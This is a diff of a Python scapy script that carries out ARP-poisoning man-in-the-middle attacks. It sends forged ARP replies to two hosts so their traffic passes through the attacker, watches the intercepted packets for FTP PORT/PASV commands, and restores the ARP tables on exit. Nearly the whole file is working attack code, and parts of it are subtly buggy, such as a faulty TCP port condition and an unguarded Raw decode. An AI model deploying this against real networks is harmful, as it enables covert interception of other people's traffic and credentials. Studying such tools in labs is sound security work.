@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 
-import sys, socket, argparse, re
-from scapy.all import ARP, Ether, srp, sniff, sendp, conf
+import sys, socket, argparse, re, signal
+from scapy.all import ARP, Ether, srp, sniff, sendp, conf, TCP, UDP, Raw
 
 
 def validate_ipv4(address):
@@ -10,35 +10,61 @@ def validate_ipv4(address):
     return bool(pattern.match(address))
 
 
-def restore_arp_tables(interface):
-    arp_request = ARP(pdst="192.168.1.0/24")
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
+def validate_mac(address):
+    pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
+    return bool(pattern.match(address))
+
+
+def restore_arp_tables(src_ip, src_mac, target_ip, target_mac, interface='eth0'):
+    arp_restore_src = ARP(pdst=target_ip, psrc=src_ip, hwdst=target_mac, hwsrc=src_mac, op=2)
+    arp_restore_target = ARP(pdst=src_ip, psrc=target_ip, hwdst=src_mac, hwsrc=target_mac, op=2)
     
-    answered_list, unanswered_list = srp(arp_request_broadcast, timeout=3, verbose=False, iface=interface)
+    sendp(Ether(dst=target_mac, src=src_mac) / arp_restore_src, iface=interface, verbose=False)
+    sendp(Ether(dst=src_mac, src=target_mac) / arp_restore_target, iface=interface, verbose=False)
     
-    clients_list = []
-    for element in answered_list:
-        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
-        clients_list.append(client_dict)
-        print(f"IP Address: {element[1].psrc}, MAC Address: {element[1].hwsrc}")
+    print("\nOriginal ARP tables restored.")
 
 
 def arp_poison(src_ip, src_mac, target_ip, target_mac, interface='eth0'):
     def poison_packet(pkt):
-        if pkt[Ether].src == src_mac and pkt[Ether].dst == target_mac:
-            newpkt = Ether(dst=target_mac, src=src_mac) / ARP(op=2, pdst=target_ip, psrc=src_ip)
-            sendp(newpkt, iface=interface)
-        elif pkt[Ether].src == target_mac and pkt[Ether].dst == src_mac:
-            newpkt = Ether(dst=src_mac, src=target_mac) / ARP(op=2, pdst=src_ip, psrc=target_ip)
-            sendp(newpkt, iface=interface)
+        print("poison_packet called")
+        if ARP in pkt and ((pkt[ARP].psrc == src_ip and pkt[ARP].pdst == target_ip) or (pkt[ARP].psrc == target_ip and pkt[ARP].pdst == src_ip)):
+            arp_reply_src_to_target = ARP(pdst=target_ip, psrc=src_ip, hwdst=target_mac, hwsrc=src_mac, op=2)
+            ether_frame_src_to_target = Ether(dst=target_mac, src=src_mac) / arp_reply_src_to_target
+            sendp(ether_frame_src_to_target, iface=interface, verbose=False)
+            print(f"Packet sent from {src_ip} to {target_ip}")
 
-    try:
-        print(f"ARP Poisoning started. Press CTRL+C to stop.")
-        sniff(iface=interface, prn=lambda x: poison_packet(x))
-    except KeyboardInterrupt:
-        restore_arp_tables(interface)
+            arp_reply_target_to_src = ARP(pdst=src_ip, psrc=target_ip, hwdst=src_mac, hwsrc=target_mac, op=2)
+            ether_frame_target_to_src = Ether(dst=src_mac, src=target_mac) / arp_reply_target_to_src
+            sendp(ether_frame_target_to_src, iface=interface, verbose=False)
+            print(f"Packet sent from {target_ip} to {src_ip}")
+
+            print(pkt.summary())
+
+        elif pkt.haslayer(TCP) and pkt[TCP].dport == 20 or pkt[TCP].sport == 20:
+            ftp_command = str(pkt[Raw].load.decode())
+            if "PORT" in ftp_command.upper() or "PASV" in ftp_command.upper():
+                print("FTP File Transfer Detected:", ftp_command)
+
+        else:
+            print("No ARP packet to poison or no FTP file transfer detected")
+
+    global sniff_thread
+    sniff_thread = None
+
+    def cleanup(signum, frame):
+        if sniff_thread is not None:
+            try:
+                sniff_thread.cancel()
+            except Exception as e:
+                print(f"Error cancelling sniff thread: {e}")
+        restore_arp_tables(src_ip, src_mac, target_ip, target_mac)
         print("ARP Poisoning stopped.")
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, cleanup)
+    print(f"ARP Poisoning started. Press CTRL+C to stop.")
+    sniff_thread = sniff(iface=interface, filter="", prn=lambda x: poison_packet(x), store=0)
 
 
 def ft_parser_args():
@@ -52,11 +78,14 @@ def main():
     try:
         ip_src, mac_src, ip_target, mac_target = args.addresses
         if not validate_ipv4(ip_src) or not validate_ipv4(ip_target):
-            print("Invalid IP address format. Please use IPv4 addresses.")
+            print("Invalid IP address format")
+            exit(1)
+        if not validate_mac(mac_src) or not validate_mac(mac_target):
+            print("Invalid MAC address format")
             exit(1)
         arp_poison(ip_src, mac_src, ip_target, mac_target)
     except ValueError:
-        print("Invalid IP address format. Please use IPv4 addresses.")
+        print("Invalid IP address format")
     except Exception as e:
         print(f"An unexpected error occurred: {e}")
 
